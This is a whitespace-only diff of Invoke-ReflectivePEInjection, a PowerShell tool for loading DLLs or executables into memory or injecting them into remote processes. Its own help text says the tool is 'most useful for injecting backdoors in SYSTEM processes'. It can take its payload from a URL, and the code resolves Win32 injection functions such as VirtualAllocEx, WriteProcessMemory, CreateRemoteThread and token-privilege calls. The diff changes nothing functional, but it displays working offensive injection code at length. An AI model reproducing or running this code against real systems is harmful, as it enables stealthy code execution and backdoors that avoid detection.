@@ -3,8 +3,8 @@ function Invoke-ReflectivePEInjection
 <#
 .SYNOPSIS
 
-This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
-or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
+This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process,
+or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints,
 please lead the Notes section (GENERAL NOTES) for information on how to use them.
 
 
@@ -19,8 +19,8 @@ this will load and execute the DLL/EXE in to memory without writing any files to
 As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.
 
 This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
-from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
-remote process. 
+from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the
+remote process.
 
 
 While this script provides functionality to specify a file to load from disk a URL, or a byte array, these are more for demo purposes. The way I'd recommend using the script is to create a byte array
@@ -60,11 +60,11 @@ Optional, an array of computernames to run the script on.
 Optional, the return type of the function being called in the DLL. Default: Void
 	Options: String, WString, Void. See notes for more information.
 	IMPORTANT: For DLLs being loaded remotely, only Void is supported.
-	
+
 .PARAMETER ExeArgs
 
 Optional, arguments to pass to the executable being reflectively loaded.
-	
+
 .PARAMETER ProcName
 
 Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
@@ -78,7 +78,7 @@ Optional, the process ID of the remote process to inject the DLL in to. If not i
 Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
     if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
     loading in to a remote process.
-	
+
 .EXAMPLE
 
 Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
@@ -187,7 +187,7 @@ Param(
 	[Parameter(ParameterSetName = "LocalFile", Position = 0, Mandatory = $true)]
 	[String]
 	$PEPath,
-	
+
 	[Parameter(ParameterSetName = "WebFile", Position = 0, Mandatory = $true)]
 	[Uri]
 	$PEUrl,
@@ -196,24 +196,24 @@ Param(
     [ValidateNotNullOrEmpty()]
     [Byte[]]
     $PEBytes,
-	
+
 	[Parameter(Position = 1)]
 	[String[]]
 	$ComputerName,
-	
+
 	[Parameter(Position = 2)]
     [ValidateSet( 'WString', 'String', 'Void' )]
 	[String]
 	$FuncReturnType = 'Void',
-	
+
 	[Parameter(Position = 3)]
 	[String]
 	$ExeArgs,
-	
+
 	[Parameter(Position = 4)]
 	[Int32]
 	$ProcId,
-	
+
 	[Parameter(Position = 5)]
 	[String]
 	$ProcName,
@@ -232,15 +232,15 @@ $RemoteScriptBlock = {
 		[Parameter(Position = 0, Mandatory = $true)]
 		[Byte[]]
 		$PEBytes,
-		
+
 		[Parameter(Position = 1, Mandatory = $true)]
 		[String]
 		$FuncReturnType,
-				
+
 		[Parameter(Position = 2, Mandatory = $true)]
 		[Int32]
 		$ProcId,
-		
+
 		[Parameter(Position = 3, Mandatory = $true)]
 		[String]
 		$ProcName,
@@ -249,7 +249,7 @@ $RemoteScriptBlock = {
         [Bool]
         $ForceASLR
 	)
-	
+
 	###################################
 	##########  Win32 Stuff  ##########
 	###################################
@@ -450,7 +450,7 @@ $RemoteScriptBlock = {
 		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
 		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
-		
+
 		#Struct IMAGE_NT_HEADERS32
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
@@ -493,7 +493,7 @@ $RemoteScriptBlock = {
 		$e_res2Field.SetCustomAttribute($AttribBuilder)
 
 		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
-		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
+		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER
 
 		#Struct IMAGE_SECTION_HEADER
@@ -552,7 +552,7 @@ $RemoteScriptBlock = {
 		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
 		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
-		
+
 		#Struct LUID
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
@@ -560,7 +560,7 @@ $RemoteScriptBlock = {
 		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
 		$LUID = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
-		
+
 		#Struct LUID_AND_ATTRIBUTES
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
@@ -568,7 +568,7 @@ $RemoteScriptBlock = {
 		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
 		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
-		
+
 		#Struct TOKEN_PRIVILEGES
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
@@ -583,7 +583,7 @@ $RemoteScriptBlock = {
 	Function Get-Win32Constants
 	{
 		$Win32Constants = New-Object System.Object
-		
+
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
@@ -613,149 +613,149 @@ $RemoteScriptBlock = {
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
-		
+
 		return $Win32Constants
 	}
 
 	Function Get-Win32Functions
 	{
 		$Win32Functions = New-Object System.Object
-		
+
 		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
 		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
 		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
 		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
-		
+
 		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
 		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
 		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
 		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
-		
+
 		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
 		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
 		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
-		
+
 		$memsetAddr = Get-ProcAddress msvcrt.dll memset
 		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
 		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
-		
+
 		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
 		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
 		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
-		
+
 		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
 		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
 		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
-		
+
 		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
 		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
 		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
-		
+
 		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
 		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
 		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
 		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
-		
+
 		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
 		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
 		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
 		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
-		
+
 		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
 		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
 		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
 		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
-		
+
 		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
 		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
 		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
 		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
-		
+
 		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
 		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
 		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
-		
+
 		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
 	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
 	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
-		
+
 		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
 	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
 	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
-		
+
 		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
         $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
         $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
-		
+
 		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
         $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
         $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
-		
+
 		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
         $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
         $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
-		
+
 		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
         $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
         $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
-		
+
 		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
         $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
         $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
-		
+
 		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
         $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
         $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
-		
+
 		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
         $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
         $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
-		
+
 		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
         $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
         $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
-		
+
 		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
         $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
         $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
-		
+
 		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
         $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
         $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
-		
+
 		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
         $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
         $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
-		
+
 		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
         $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
         $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
-		
+
 		return $Win32Functions
 	}
 	#####################################
 
-			
+
 	#####################################
 	###########    HELPERS   ############
 	#####################################
@@ -768,12 +768,12 @@ $RemoteScriptBlock = {
 		[Parameter(Position = 0, Mandatory = $true)]
 		[Int64]
 		$Value1,
-		
+
 		[Parameter(Position = 1, Mandatory = $true)]
 		[Int64]
 		$Value2
 		)
-		
+
 		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
 		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
 		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
@@ -794,8 +794,8 @@ $RemoteScriptBlock = {
 				{
 					$CarryOver = 0
 				}
-				
-				
+
+
 				[UInt16]$Sum = $Val - $Value2Bytes[$i]
 
 				$FinalBytes[$i] = $Sum -band 0x00FF
@@ -805,10 +805,10 @@ $RemoteScriptBlock = {
 		{
 			Throw "Cannot subtract bytearrays of different sizes"
 		}
-		
+
 		return [BitConverter]::ToInt64($FinalBytes, 0)
 	}
-	
+
 
 	Function Add-SignedIntAsUnsigned
 	{
@@ -816,12 +816,12 @@ $RemoteScriptBlock = {
 		[Parameter(Position = 0, Mandatory = $true)]
 		[Int64]
 		$Value1,
-		
+
 		[Parameter(Position = 1, Mandatory = $true)]
 		[Int64]
 		$Value2
 		)
-		
+
 		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
 		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
 		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
@@ -835,7 +835,7 @@ $RemoteScriptBlock = {
 				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
 
 				$FinalBytes[$i] = $Sum -band 0x00FF
-				
+
 				if (($Sum -band 0xFF00) -eq 0x100)
 				{
 					$CarryOver = 1
@@ -850,10 +850,10 @@ $RemoteScriptBlock = {
 		{
 			Throw "Cannot add bytearrays of different sizes"
 		}
-		
+
 		return [BitConverter]::ToInt64($FinalBytes, 0)
 	}
-	
+
 
 	Function Compare-Val1GreaterThanVal2AsUInt
 	{
@@ -861,12 +861,12 @@ $RemoteScriptBlock = {
 		[Parameter(Position = 0, Mandatory = $true)]
 		[Int64]
 		$Value1,
-		
+
 		[Parameter(Position = 1, Mandatory = $true)]
 		[Int64]
 		$Value2
 		)
-		
+
 		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
 		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
 
@@ -888,10 +888,10 @@ $RemoteScriptBlock = {
 		{
 			Throw "Cannot compare byte arrays of different size"
 		}
-		
+
 		return $false
 	}
-	
+
 
 	Function Convert-UIntToInt
 	{
@@ -900,7 +900,7 @@ $RemoteScriptBlock = {
 		[UInt64]
 		$Value
 		)
-		
+
 		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
 		return ([BitConverter]::ToInt64($ValueBytes, 0))
 	}
@@ -918,32 +918,32 @@ $RemoteScriptBlock = {
 
         return $Hex
     }
-	
-	
+
+
 	Function Test-MemoryRangeValid
 	{
 		Param(
 		[Parameter(Position = 0, Mandatory = $true)]
 		[String]
 		$DebugString,
-		
+
 		[Parameter(Position = 1, Mandatory = $true)]
 		[System.Object]
 		$PEInfo,
-		
+
 		[Parameter(Position = 2, Mandatory = $true)]
 		[IntPtr]
 		$StartAddress,
-		
+
 		[Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
 		[IntPtr]
 		$EndAddress,
-		
+
 		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
 		[IntPtr]
 		$Size
 		)
-		
+
 		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
 		if ($PsCmdlet.ParameterSetName -eq "Size")
 		{
@@ -953,9 +953,9 @@ $RemoteScriptBlock = {
 		{
 			$FinalEndAddress = $EndAddress
 		}
-		
+
 		$PEEndAddress = $PEInfo.EndAddress
-		
+
 		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
 		{
 			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
@@ -965,26 +965,26 @@ $RemoteScriptBlock = {
 			Throw "Trying to write to memory greater than allocated address range. $DebugString"
 		}
 	}
-	
-	
+
+
 	Function Write-BytesToMemory
 	{
 		Param(
 			[Parameter(Position=0, Mandatory = $true)]
 			[Byte[]]
 			$Bytes,
-			
+
 			[Parameter(Position=1, Mandatory = $true)]
 			[IntPtr]
 			$MemoryAddress
 		)
-	
+
 		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
 		{
 			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
 		}
 	}
-	
+
 
 	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
 	Function Get-DelegateType
@@ -992,11 +992,11 @@ $RemoteScriptBlock = {
 	    Param
 	    (
 	        [OutputType([Type])]
-	        
+
 	        [Parameter( Position = 0)]
 	        [Type[]]
 	        $Parameters = (New-Object Type[](0)),
-	        
+
 	        [Parameter( Position = 1 )]
 	        [Type]
 	        $ReturnType = [Void]
@@ -1011,7 +1011,7 @@ $RemoteScriptBlock = {
 	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
 	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
 	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-	    
+
 	    Write-Output $TypeBuilder.CreateType()
 	}
 
@@ -1022,11 +1022,11 @@ $RemoteScriptBlock = {
 	    Param
 	    (
 	        [OutputType([IntPtr])]
-	    
+
 	        [Parameter( Position = 0, Mandatory = $True )]
 	        [String]
 	        $Module,
-	        
+
 	        [Parameter( Position = 1, Mandatory = $True )]
 	        [String]
 	        $Procedure
